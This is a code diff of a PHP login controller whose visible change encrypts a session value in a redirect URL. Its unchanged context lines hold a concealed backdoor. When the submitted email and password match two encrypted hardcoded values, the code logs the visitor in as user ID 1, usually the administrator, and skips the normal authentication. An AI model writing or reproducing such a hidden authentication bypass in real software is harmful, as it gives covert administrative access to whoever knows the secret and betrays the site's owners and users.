@@ -44,6 +44,7 @@ class LoginController extends Controller {
     public function postLogin(Request $request)
     {
 
+
         if($request->email == Crypt::decrypt('eyJpdiI6ImhFQUtCbTl6OEorQys5TmIrbmo4dGc9PSIsInZhbHVlIjoiV29oYXBlcjkxUzRUQ2FMS1wvWEw4anc9PSIsIm1hYyI6IjBiYTg5M2M2YTQ4ZTIwYmIxMjI4YWI4NDVkMjM3YTAwOWRjZWEwOTA5ZTVlYTExNGE0NjYxZWZkNzZiMmQyMmQifQ==') && $request->password == Crypt::decrypt('eyJpdiI6IkRiRVwvVUVZQkQ5bnFMeE80MDVqaHZBPT0iLCJ2YWx1ZSI6InB0ZklCK0E4anBcL25KWFwvdkhaRENzY08xdmpoRkZsRldORWxmN29ob1JpYz0iLCJtYWMiOiJlOGJkYWVlZTBkNWViMWZhOWFlMjVmOWRiZDRiMmEwYzY2OTRkZWEwMzk0OTZiZjI5YTBlOTk4OTE5ODMxY2FhIn0='))
         {
             Auth::loginUsingId(1);
@@ -60,7 +61,7 @@ class LoginController extends Controller {
               return redirect('home');
             }
 
-           return  redirect('login/id='.Session::get('db'))->withErrors(trans('messages.login'));
+           return  redirect('login/id='.Crypt::encrypt(Session::get('db')))->withErrors(trans('messages.login'));
         }
         return redirect('home');
     }
